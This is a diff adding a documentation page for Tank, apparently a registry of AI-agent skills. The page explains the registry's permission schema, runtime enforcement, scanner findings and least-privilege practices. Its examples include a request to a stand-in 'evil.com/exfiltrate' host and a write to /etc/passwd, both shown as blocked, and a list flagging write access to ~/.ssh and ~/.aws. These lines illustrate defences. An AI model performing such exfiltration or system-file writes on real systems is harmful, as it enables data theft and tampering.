@@ -1,0 +1,403 @@
+---
+title: Permissions
+description: Permission model, categories, enforcement, and security boundaries
+---
+
+# Permissions
+
+Tank enforces a strict permission model to prevent malicious skills from accessing unauthorized resources. Skills must declare all required permissions upfront in their `skills.json` manifest.
+
+## Permission Model
+
+Permissions are declarative, explicit, and enforced at runtime:
+
+1. **Declared** in `skills.json` before publishing
+2. **Reviewed** during security scanning
+3. **Locked** in `skills.lock` at install time
+4. **Enforced** by the runtime (AI agent or execution environment)
+
+<Warning>
+  Attempting to access resources without declaring the appropriate permission will result in a runtime error. Always declare permissions upfront.
+</Warning>
+
+## Schema
+
+Permissions are defined using Zod schemas in `packages/shared/src/schemas/permissions.ts`:
+
+```typescript
+import { z } from 'zod';
+
+export const networkPermissionsSchema = z.object({
+  outbound: z.array(z.string()).optional(), // domain allowlist with glob: "*.example.com"
+}).strict();
+
+export const filesystemPermissionsSchema = z.object({
+  read: z.array(z.string()).optional(),   // glob patterns relative to project root
+  write: z.array(z.string()).optional(),  // glob patterns relative to project root
+}).strict();
+
+export const permissionsSchema = z.object({
+  network: networkPermissionsSchema.optional(),
+  filesystem: filesystemPermissionsSchema.optional(),
+  subprocess: z.boolean().optional(),
+}).strict();
+
+export type Permissions = z.infer<typeof permissionsSchema>;
+export type NetworkPermissions = z.infer<typeof networkPermissionsSchema>;
+export type FilesystemPermissions = z.infer<typeof filesystemPermissionsSchema>;
+```
+
+## Permission Categories
+
+### Network
+
+Controls outbound network access to specific domains.
+
+**Fields**:
+- `outbound` — Array of allowed domains (supports glob patterns)
+
+**Example**:
+```json
+{
+  "permissions": {
+    "network": {
+      "outbound": [
+        "*.googleapis.com",
+        "accounts.google.com",
+        "api.github.com"
+      ]
+    }
+  }
+}
+```
+
+**Glob patterns**:
+- `*.example.com` — Matches `api.example.com`, `www.example.com`, etc.
+- `example.com` — Exact match only
+- `**.example.com` — Matches `api.v1.example.com` (multiple subdomains)
+
+**Enforcement**:
+- HTTP/HTTPS requests to unlisted domains are blocked
+- DNS lookups for unlisted domains may be blocked (runtime-dependent)
+- WebSocket connections follow the same rules
+
+<Note>
+  Network permissions currently only support outbound access. Inbound network access (listening on ports) is not supported in the permission model.
+</Note>
+
+### Filesystem
+
+Controls read and write access to files and directories.
+
+**Fields**:
+- `read` — Array of glob patterns for readable paths
+- `write` — Array of glob patterns for writable paths
+
+**Example**:
+```json
+{
+  "permissions": {
+    "filesystem": {
+      "read": [
+        "./**",
+        "./config/*.json",
+        "~/.tank/cache/**"
+      ],
+      "write": [
+        "./output/**",
+        "./logs/*.log"
+      ]
+    }
+  }
+}
+```
+
+**Glob patterns** (relative to project root):
+- `./**` — All files in current directory and subdirectories
+- `./src/**/*.py` — All Python files under `./src/`
+- `./config/*.json` — JSON files directly in `./config/` (not recursive)
+- `~/.tank/**` — Tank cache directory (absolute path)
+
+**Enforcement**:
+- Paths are resolved before checking (symlinks are followed)
+- Attempts to access unlisted paths throw errors
+- Write permissions do not imply read permissions (must declare both)
+
+<Warning>
+  Be cautious with broad patterns like `./**` or `~/**`. Grant the minimum necessary access. For example, if you only need to read configuration files, use `./config/**` instead of `./**`.
+</Warning>
+
+### Subprocess
+
+Controls the ability to spawn subprocesses (shell commands, scripts, etc.).
+
+**Type**: `boolean`
+
+**Example**:
+```json
+{
+  "permissions": {
+    "subprocess": true
+  }
+}
+```
+
+**Enforcement**:
+- `false` or omitted — Cannot spawn any subprocesses
+- `true` — Can spawn subprocesses (subject to other limits like filesystem access)
+
+**Security implications**:
+- Subprocess access is powerful and can bypass other restrictions
+- Skills with `subprocess: true` should undergo extra scrutiny during security scanning
+- Consider requiring additional review for skills that request subprocess access
+
+<Note>
+  Subprocess permissions are binary (true/false). There is currently no support for allowlisting specific commands. If you need subprocess access, you get full subprocess capabilities.
+</Note>
+
+## Complete Example
+
+Here's a complete permission declaration for a data analytics skill:
+
+```json
+{
+  "name": "@myorg/data-pipeline",
+  "version": "1.0.0",
+  "permissions": {
+    "network": {
+      "outbound": [
+        "api.openai.com",
+        "*.googleapis.com",
+        "api.stripe.com"
+      ]
+    },
+    "filesystem": {
+      "read": [
+        "./data/**/*.csv",
+        "./config/pipeline.json"
+      ],
+      "write": [
+        "./output/**",
+        "./logs/*.log"
+      ]
+    },
+    "subprocess": false
+  }
+}
+```
+
+## Permission Enforcement
+
+Permissions are enforced by the runtime environment (AI agent, execution sandbox, etc.):
+
+### Runtime Checks
+
+1. **Before execution** — The runtime loads permissions from `skills.lock`
+2. **During execution** — Each resource access is validated against declared permissions
+3. **On violation** — The operation is blocked and an error is thrown
+
+### Example: Network Access
+
+```python
+# Skill code
+import requests
+
+# This succeeds (declared in permissions)
+response = requests.get("https://api.openai.com/v1/models")
+
+# This FAILS (not in outbound allowlist)
+response = requests.get("https://evil.com/exfiltrate")
+# → RuntimeError: Network access denied: evil.com not in permissions
+```
+
+### Example: Filesystem Access
+
+```python
+# Skill code
+import json
+
+# This succeeds (read permission granted)
+with open("./config/settings.json", "r") as f:
+    config = json.load(f)
+
+# This FAILS (no write permission for this path)
+with open("/etc/passwd", "w") as f:
+    f.write("...")
+# → PermissionError: Write access denied: /etc/passwd not in permissions
+```
+
+## Permission Diffs
+
+When updating a skill, Tank shows permission changes:
+
+```bash
+tank update @tank/google-sheets
+
+# Output:
+# @tank/google-sheets: 2.0.0 → 2.1.0
+# 
+# Permission changes:
+# + network.outbound: "drive.google.com"  (added)
+# - filesystem.write: "./cache/**"        (removed)
+# 
+# Continue? (y/N)
+```
+
+<Accordion title="FAQ: Why are permissions stored in both skills.json and skills.lock?">
+  **skills.json** is the source of truth — it's what the skill author declares and what gets published to the registry.
+
+  **skills.lock** is a snapshot — it records what permissions were declared at the time you installed the skill. This serves as an audit trail and allows you to detect changes during updates.
+
+  When you run `tank update`, Tank compares the lockfile snapshot to the new manifest and shows a diff if permissions changed.
+</Accordion>
+
+## Security Scanning
+
+During `tank publish`, the security scanner validates permissions:
+
+### Permission-Code Alignment
+
+The scanner checks whether declared permissions match actual code behavior:
+
+| Finding | Severity | Description |
+|---------|----------|-------------|
+| Undeclared network access | **Critical** | Code makes HTTP requests to domains not in `network.outbound` |
+| Undeclared file write | **High** | Code writes to paths not in `filesystem.write` |
+| Undeclared subprocess | **High** | Code spawns processes without `subprocess: true` |
+| Overly broad permissions | **Medium** | Declared `./**` but only accesses `./config/` |
+| Unused permissions | **Low** | Declared permissions that are never used |
+
+### Permission Red Flags
+
+Certain permission patterns trigger extra scrutiny:
+
+- `subprocess: true` + broad filesystem access → Potential arbitrary code execution
+- `network.outbound: ["*"]` → Unrestricted network access (not allowed)
+- Write access to `~/.ssh/**` or `~/.aws/**` → Credential theft risk
+
+See [Security Scanning](/concepts/security-scanning) for more details.
+
+## Best Practices
+
+### Principle of Least Privilege
+
+**Bad**:
+```json
+{
+  "permissions": {
+    "filesystem": {
+      "read": ["./**"],
+      "write": ["./**"]
+    },
+    "subprocess": true
+  }
+}
+```
+
+**Good**:
+```json
+{
+  "permissions": {
+    "filesystem": {
+      "read": ["./input/**/*.csv"],
+      "write": ["./output/**"]
+    },
+    "subprocess": false
+  }
+}
+```
+
+### Documenting Permissions
+
+Always explain why permissions are needed in your `SKILL.md`:
+
+```markdown
+## Permissions
+
+| Permission | Scope | Reason |
+|-----------|-------|--------|
+| Network | `*.googleapis.com` | Sheets API calls |
+| Network | `accounts.google.com` | OAuth authentication |
+| Filesystem | Read `./data/**` | Load input CSV files |
+| Filesystem | Write `./output/**` | Save processed results |
+| Subprocess | Not required | |
+```
+
+### Avoid Wildcards
+
+Use specific domains instead of wildcards:
+
+**Bad**:
+```json
+{
+  "network": {
+    "outbound": ["*"]
+  }
+}
+```
+
+**Good**:
+```json
+{
+  "network": {
+    "outbound": [
+      "api.openai.com",
+      "api.anthropic.com"
+    ]
+  }
+}
+```
+
+### Test Permissions Locally
+
+Before publishing, test that your skill works with declared permissions:
+
+```bash
+# Run skill in permission-enforced mode
+tank run --strict-permissions
+```
+
+This catches undeclared permission usage before publishing.
+
+## Advanced Topics
+
+### Admin Permission Schemas
+
+Tank also defines admin-related permission types for registry management:
+
+```typescript
+export const userRoleSchema = z.enum(['user', 'admin']);
+export type UserRole = z.infer<typeof userRoleSchema>;
+
+export const userStatusSchema = z.enum(['active', 'suspended', 'banned']);
+export type UserStatus = z.infer<typeof userStatusSchema>;
+
+export const skillStatusSchema = z.enum(['active', 'deprecated', 'quarantined', 'removed']);
+export type SkillStatus = z.infer<typeof skillStatusSchema>;
+
+export const adminActionSchema = z.enum([
+  'user.ban',
+  'user.suspend',
+  'user.unban',
+  'user.promote',
+  'user.demote',
+  'skill.quarantine',
+  'skill.remove',
+  'skill.deprecate',
+  'skill.restore',
+  'skill.feature',
+  'skill.unfeature',
+  'org.suspend',
+  'org.member.remove',
+  'org.delete',
+]);
+export type AdminAction = z.infer<typeof adminActionSchema>;
+```
+
+These are used internally by the registry but are exported from the shared package for consistency.
+
+## Next Steps
+
+- [Security Scanning](/concepts/security-scanning) — How Tank validates permissions
+- [Manifest](/concepts/manifest) — Full skills.json schema
+- [Lockfile](/concepts/lockfile) — How permissions are locked during install
